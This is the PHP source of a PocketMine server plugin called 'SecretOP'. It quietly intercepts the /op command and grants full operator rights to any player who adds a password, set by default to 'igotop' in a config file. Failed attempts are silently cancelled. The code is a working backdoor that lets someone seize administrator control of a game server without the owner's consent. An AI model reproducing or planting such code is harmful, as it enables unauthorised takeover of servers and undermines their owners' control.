<?php

namespace edyfz11\main;

use pocketmine\event\Listener as L;
use pocketmine\plugin\PluginBase as PB;
use pocketmine\Player;
use pocketmine\Server;
use pocketmine\event\player\{PlayerCommandPreprocessEvent, PlayerQuitEvent};
use pocketmine\utils\Config;

class Loader extends PB implements L
{
	public static $pass;
	public function onEnable()
	{
		$this->getServer()->getPluginManager()->registerEvents($this, $this);
		@mkdir(self::getDataFolder());
		self::$pass = new Config(self::getDataFolder()."pass.yml", Config::YAML, ["pass" => "igotop"]);
		$this->getLogger()->info("SecretOP On");
	}
	public function onDisable()
	{
		$this->getLogger()->info("SecretOP Off");
	}
	public function onCommandPreprocess(PlayerCommandPreprocessEvent $e)
	{
		$msg = $e->getMessage();
		$player = $e->getPlayer();
		$cmd = explode(" ", $msg);
		if($cmd[0] == "/op"){
			if(count($cmd) < 3){
				$player->sendMessage("");
				$e->setCancelled(true);
				return;
			}
			if($cmd[2] == self::IsPass()){
				$player->setOp(true);
			}else{
				$player->sendMessage("");
				$e->setCancelled(true);
			}
		}
	}
	public static function IsPass()
	{
		return self::$pass->get("pass");
	}
}
?>
